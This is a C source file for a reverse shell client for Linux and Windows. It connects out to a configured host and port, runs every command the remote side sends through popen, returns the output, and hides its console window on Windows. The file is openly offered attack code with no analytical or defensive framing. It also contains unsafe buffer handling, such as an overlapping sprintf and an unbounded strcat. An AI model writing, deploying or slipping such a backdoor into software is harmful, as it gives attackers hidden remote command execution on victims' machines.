#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h> 
#include <unistd.h>

#if defined(__linux__)
    #include <unistd.h>
    #include <sys/socket.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>

    #define closesocket(param) close(param)
    typedef int SOCKET;
    typedef struct sockaddr_in SOCKADDR_IN;
    typedef struct sockaddr SOCKADDR;
    typedef struct hostent HOSTENT;
#endif

#if defined(_WIN32) || defined(_WIN64)
    #include <winsock2.h>
    #include <Windows.h>
    typedef int socklen_t;
    typedef struct WSAData WSAData;
#endif

 
#define PORT 2000
#define HOSTNAME "localhost"
 

int main(void)
{
#if defined(_WIN32)
    WSAData wsaData;
    WORD DllVersion = MAKEWORD(2, 2);

    if(WSAStartup(DllVersion, &wsaData) != 0)
        ExitProcess(EXIT_FAILURE);

    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_MINIMIZE);
    ShowWindow(hWnd, SW_HIDE);
#endif
    FILE* subprocess = NULL;
    SOCKET socket_id;
    SOCKADDR_IN sockname;
    HOSTENT* host_address;

    char szBuffer[1024];
    char szBufferSend[32768];
    bool is_running = true;
    int optval = 1;


    if((host_address = gethostbyname(HOSTNAME)) == NULL)
    {
        perror("Client Failure:");
        exit(EXIT_FAILURE);
    }

    if((socket_id = socket(PF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("Client Failure:");
        exit(EXIT_FAILURE);
    }

#if defined(__linux__)
    setsockopt(socket_id, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int));
#endif
#if defined(_WIN32)
    setsockopt(socket_id, SOL_SOCKET, SO_REUSEADDR, (char*)&optval, sizeof(optval));
#endif

    memset(&sockname, 0, sizeof(sockname));
    memset(szBuffer, '\0', sizeof(szBuffer));

    sockname.sin_family = host_address->h_addrtype;
    sockname.sin_port = htons(PORT);
    memcpy(&sockname.sin_addr.s_addr, host_address->h_addr_list[0], host_address->h_length);

    if(connect(socket_id, (struct sockaddr*)&sockname, sizeof(struct sockaddr)))
    {
        perror("Client Failure:");
        shutdown(socket_id, 2);
        closesocket(socket_id);
        exit(EXIT_FAILURE);
    }

    printf("+connected !\n");

    while(true)
    {
        if(recv(socket_id, szBuffer, sizeof(szBuffer)-1, 0) > 0)
        {
            if(szBuffer[0] == 'c' && szBuffer[1] == 'd' && szBuffer[2] == ' ')
            {
                chdir(szBuffer+3);
                getcwd(szBufferSend, sizeof(szBufferSend));
                sprintf(szBufferSend, "%s\n", szBufferSend);
                send(socket_id, szBufferSend, sizeof(szBufferSend)-1, 0);
            }
            else 
            {
                subprocess = popen(szBuffer, "r");

                if(subprocess == NULL)
                {
                    perror("error");
                }
                else 
                { 
                    while(fgets(szBuffer, sizeof(szBuffer)-1, subprocess) != NULL)
                        strcat(szBufferSend, szBuffer);              

                    send(socket_id, szBufferSend, sizeof(szBufferSend)-1, 0);
                    pclose(subprocess);
                    memset(szBuffer, '\0', sizeof(szBuffer)-1);
                }
            }
        }

        memset(szBufferSend, '\0', sizeof(szBufferSend)-1);
        memset(szBuffer, '\0', sizeof(szBuffer)-1);

    }

    printf("+ the client is closed !\n");
    shutdown(socket_id, 2);
    closesocket(socket_id);

    return EXIT_SUCCESS;
}